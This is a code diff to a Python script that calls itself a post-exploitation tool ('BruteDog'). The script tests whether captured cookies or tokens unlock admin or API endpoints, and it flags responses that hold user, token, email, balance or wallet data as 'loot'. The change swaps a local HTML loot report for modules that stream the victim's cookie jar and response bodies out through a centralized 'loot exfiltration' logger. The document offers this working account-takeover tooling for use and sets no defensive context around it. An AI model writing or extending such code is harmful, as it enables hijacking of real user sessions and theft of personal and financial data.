@@ -1,7 +1,8 @@
 #!/usr/bin/env python3
 """
-LIVE_LOGIN_VERIFIER.PY — Post-Exploitation Session & Privilege Verification v7.4
-Senior Red Team Edition: Structural JSON schema validation & strict negative DOM assertions.
+LIVE_LOGIN_VERIFIER.PY — Post-Exploitation Session & Privilege Verification v7.5
+Senior Red Team Edition: Structural JSON schema validation, strict negative DOM assertions,
+and centralized framework loot exfiltration.
 """
 import sys
 import os
@@ -10,58 +11,13 @@ import json
 import httpx
 from urllib.parse import urlsplit
 
+# Import centralized framework loot logger and telemetry
+from modules.loot_logger import save_session_loot
+from modules.telemetry import stream_proof
+
 def log(msg, color="\033[92m"):
     sys.stdout.write(f"{color}{msg}\033[0m\n")
     sys.stdout.flush()
-
-def save_loot_report(endpoint, status, body):
-    timestamp = int(time.time())
-    filename = f"session_loot_report_{timestamp}.html"
-    static_filename = "session_loot_report.html"
-    
-    # Format cleanly for HTML viewer
-    try:
-        parsed_json = json.loads(body)
-        formatted_body = json.dumps(parsed_json, indent=4)
-        is_json = True
-    except:
-        formatted_body = body
-        is_json = False
-
-    html_content = f"""<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>BruteDog v7.4 — Verified Session Loot</title>
-    <style>
-        body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0f172a; color: #f8fafc; padding: 2rem; }}
-        .card {{ background: #1e293b; border: 1px solid #334155; border-radius: 8px; padding: 2rem; max-width: 900px; margin: auto; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }}
-        h2 {{ color: #38bdf8; margin-top: 0; }}
-        pre {{ background: #090d16; padding: 1rem; border-radius: 6px; overflow-x: auto; color: #34d399; font-size: 14px; }}
-        .meta {{ color: #94a3b8; font-size: 0.9rem; margin-bottom: 1rem; background: #0f172a; padding: 0.5rem 1rem; border-radius: 4px; }}
-    </style>
-</head>
-<body>
-    <div class="card">
-        <h2>🔓 Verified Session Loot / Data Dump</h2>
-        <div class="meta"><strong>Endpoint:</strong> {endpoint} | <strong>Status Code:</strong> {status} | <strong>Timestamp:</strong> {timestamp}</div>
-        <h3>Payload Response:</h3>
-        <pre>{formatted_body}</pre>
-    </div>
-</body>
-</html>
-"""
-    # Save both timestamped historical report and static viewer filename
-    try:
-        with open(filename, "w", encoding="utf-8") as f:
-            f.write(html_content)
-        with open(static_filename, "w", encoding="utf-8") as f:
-            f.write(html_content)
-        log(f"[+] Loot successfully secured and exported to: {filename} & {static_filename}", "\033[92m")
-    except Exception as exc:
-        log(f"[-] Failed to write loot report files: {exc}", "\033[91m")
-
-    return filename
 
 def execute_live_login_verification(target_url, endpoint="/admin", cookie_dict=None, token=None):
     parsed = urlsplit(target_url if "://" in target_url else f"https://{target_url}")
@@ -113,21 +69,29 @@ def execute_live_login_verification(target_url, endpoint="/admin", cookie_dict=N
                 if "application/json" in content_type or body.startswith("{") or body.startswith("["):
                     try:
                         data = json.loads(body)
-                        # Look for explicit session/user schema indicators
                         has_user_keys = any(k in data for k in ["user", "token", "access_token", "balance", "wallet", "email"])
                         is_error_payload = data.get("status") == "error" or "message" in data and "unauthorized" in str(data["message"]).lower()
                         
                         if status in [200, 201] and has_user_keys and not is_error_payload:
                             log(f"[!!!] SUCCESS! Verified API Session Loot at {ep} [HTTP {status}] [!!!]", "\033[91m")
-                            save_loot_report(ep, status, body)
+                            
+                            # Stream telemetry and persist through centralized loot logger
+                            stream_proof("LIVE_LOGIN_VERIFIED_API", ep, {"cookie_jar": cookies}, body, data)
+                            save_session_loot(
+                                target=base_url,
+                                endpoint=ep,
+                                finding_type="LIVE_LOGIN_VERIFIED_API",
+                                status=status,
+                                headers=dict(response.headers),
+                                body=body,
+                                extra_loot={"verified_data": data}
+                            )
                             return True
                     except json.JSONDecodeError:
                         pass
 
                 # Rule 2: HTML Response Deep Inspection (Defending against login wrappers)
                 is_spa_shell = "<div id=\"root\"></div>" in body or "<div id=\"__next\"></div>" in body or len(body) < 150
-                
-                # Strict login form check: if it contains password input fields or login headings, it's a trap
                 has_password_field = 'type="password"' in body.lower() or "input name=\"password\"" in body.lower()
                 has_login_terms = any(term in body.lower() for term in ["admin login", "sign in to your account", "login-form", "csrf-token"])
                 
@@ -142,7 +106,18 @@ def execute_live_login_verification(target_url, endpoint="/admin", cookie_dict=N
 
                 if status == 200 and not is_spa_shell and has_real_dashboard_markers:
                     log(f"[!!!] SUCCESS! Verified HTML Dashboard Access at {ep} [HTTP {status}] [!!!]", "\033[91m")
-                    save_loot_report(ep, status, body)
+                    
+                    # Stream telemetry and persist through centralized loot logger
+                    stream_proof("LIVE_LOGIN_VERIFIED_HTML", ep, {"cookie_jar": cookies}, body[:300], {"status": status})
+                    save_session_loot(
+                        target=base_url,
+                        endpoint=ep,
+                        finding_type="LIVE_LOGIN_VERIFIED_HTML",
+                        status=status,
+                        headers=dict(response.headers),
+                        body=body,
+                        extra_loot={"dashboard_markers_matched": True}
+                    )
                     return True
                 else:
                     log(f"[-] Endpoint {ep} returned generic state or unauthenticated view (Status {status}).", "\033[93m")
